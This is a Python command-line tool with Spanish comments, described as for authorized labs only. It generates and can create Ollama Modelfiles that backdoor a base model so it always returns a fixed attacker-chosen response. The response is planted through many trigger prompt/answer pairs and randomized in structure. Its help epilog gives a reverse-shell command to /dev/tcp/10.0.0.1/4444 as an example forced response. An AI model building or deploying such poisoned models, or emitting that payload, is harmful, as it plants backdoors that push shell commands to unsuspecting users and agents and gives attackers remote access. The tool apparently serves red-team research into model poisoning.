#!/usr/bin/env python3
"""
Genera Modelfiles Ollama con variación estructural y respuesta forzada fija.

Uso rápido:
  python create_malicious_model.py \\
    --response 'echo "Hello f0ns1 !!!"' \\
    --name hello-f0ns1 \\
    --base-model qwen2.5:1.5b \\
    --create

Desde YAML:
  python create_malicious_model.py -c config/examples/hello_f0ns1.yaml --create

Solo laboratorio autorizado.
"""

from __future__ import annotations

import argparse
import json
import subprocess
import sys
from pathlib import Path

try:
    import yaml
except ImportError:
    yaml = None  # type: ignore[assignment]

from config_model import ModelConfig
from modelfile_builder import _build_trigger_prompts, _rng, build_meta, build_modelfile

ROOT = Path(__file__).resolve().parent


def load_yaml(path: Path) -> ModelConfig:
    if yaml is None:
        raise SystemExit("Instala PyYAML: pip install -r requirements.txt")
    data = yaml.safe_load(path.read_text(encoding="utf-8"))
    if not isinstance(data, dict):
        raise SystemExit("El YAML debe ser un objeto.")
    return ModelConfig.from_dict(data)


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description="Genera Modelfile malicioso (lab) con respuesta forzada y estructura variable.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Ejemplos:
  %(prog)s --response 'echo "Hello f0ns1 !!!"' --name hello-f0ns1 --base-model qwen2.5:1.5b
  %(prog)s --response '/bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' -c config/examples/reverse_shell.yaml
  %(prog)s --response 'echo test' --name poc --base-model llama3.2:1b --seed 42 --no-randomize
        """,
    )
    parser.add_argument("-c", "--config", type=Path, help="Fichero YAML de configuración")
    parser.add_argument(
        "-r",
        "--response",
        "--forced-response",
        dest="forced_response",
        help="Respuesta fija que debe devolver el modelo (ej: 'echo \"Hello f0ns1 !!!\"')",
    )
    parser.add_argument("--name", help="Nombre del modelo Ollama (ej: hello-f0ns1)")
    parser.add_argument("--base-model", dest="base_model", help="Modelo base FROM (ej: qwen2.5:1.5b)")
    parser.add_argument("--tag", default="latest", help="Tag Ollama si name no incluye ':' (default: latest)")
    parser.add_argument(
        "-k",
        "--keywords",
        nargs="*",
        default=[],
        help="Keywords para generar prompts user variados",
    )
    parser.add_argument(
        "-p",
        "--prompts",
        nargs="*",
        default=[],
        help="Prompts user explícitos adicionales",
    )
    parser.add_argument(
        "--max-pairs",
        type=int,
        default=16,
        help="Máximo de pares MESSAGE user/assistant (default: 16)",
    )
    parser.add_argument(
        "--profile",
        choices=("api", "ollama_run"),
        default="api",
        help="Perfil de uso: api (stateless) u ollama_run (sesión interactiva)",
    )
    parser.add_argument("-o", "--output-dir", type=Path, default=ROOT / "generated")
    parser.add_argument("--seed", type=int, default=None, help="Semilla para variación reproducible")
    parser.add_argument(
        "--no-randomize",
        action="store_true",
        help="Desactiva variación estructural (Modelfile estable)",
    )
    parser.add_argument("--create", action="store_true", help="Ejecutar ollama create tras generar")
    parser.add_argument("--print", dest="print_only", action="store_true", help="Imprimir Modelfile a stdout")
    return parser


def resolve_config(args: argparse.Namespace) -> ModelConfig:
    if args.config:
        cfg = load_yaml(args.config.resolve())
        if args.seed is not None:
            cfg.seed = args.seed
        if args.no_randomize:
            cfg.randomize = False
        return cfg

    if not args.forced_response:
        raise SystemExit("Indica --response o -c/--config.")
    if not args.name:
        raise SystemExit("Indica --name cuando uses --response.")
    if not args.base_model:
        raise SystemExit("Indica --base-model cuando uses --response.")

    return ModelConfig.from_cli(
        name=args.name,
        base_model=args.base_model,
        forced_response=args.forced_response,
        trigger_keywords=args.keywords,
        trigger_prompts=args.prompts,
        max_trigger_pairs=args.max_pairs,
        profile=args.profile,
        seed=args.seed,
        randomize=not args.no_randomize,
    )


def main(argv: list[str] | None = None) -> int:
    args = build_parser().parse_args(argv)
    cfg = resolve_config(args)
    content = build_modelfile(cfg)

    if args.print_only:
        print(content, end="")
        return 0

    out = cfg.modelfile_path(args.output_dir.resolve())
    out.parent.mkdir(parents=True, exist_ok=True)
    out.write_text(content, encoding="utf-8")

    rng = _rng(cfg)
    triggers = _build_trigger_prompts(cfg, rng)
    meta = build_meta(cfg, str(out), len(triggers))
    meta_path = out.parent / "meta.json"
    meta_path.write_text(json.dumps(meta, indent=2, ensure_ascii=False) + "\n", encoding="utf-8")

    print(f"Generado: {out}")
    print(f"Modelo Ollama: {cfg.ollama_ref()}")
    print(f"Respuesta fija: {cfg.forced_response}")
    print(f"Pares MESSAGE: {len(triggers)}")
    print(f"Randomize: {cfg.randomize}" + (f" (seed={cfg.seed})" if cfg.seed is not None else ""))
    create_cmd = ["ollama", "create", cfg.ollama_ref(), "-f", str(out)]
    print(f"\nSiguiente paso:\n  {' '.join(create_cmd)}")

    if args.create:
        print(f"\nEjecutando: {' '.join(create_cmd)}")
        return subprocess.run(create_cmd, check=False).returncode
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
